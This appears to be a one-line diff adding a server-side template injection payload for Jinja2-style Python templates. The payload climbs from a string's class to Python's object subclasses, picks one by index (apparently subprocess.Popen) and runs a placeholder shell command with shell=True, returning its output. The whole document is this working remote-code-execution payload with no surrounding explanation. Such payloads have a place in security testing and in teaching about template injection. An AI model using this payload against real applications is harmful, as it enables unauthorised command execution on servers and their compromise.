@@ -1,0 +1,1 @@
+{{''.__class__.mro()[1].__subclasses__()[index]('<command>',shell=True,stdout=-1).communicate()[0].strip()}}
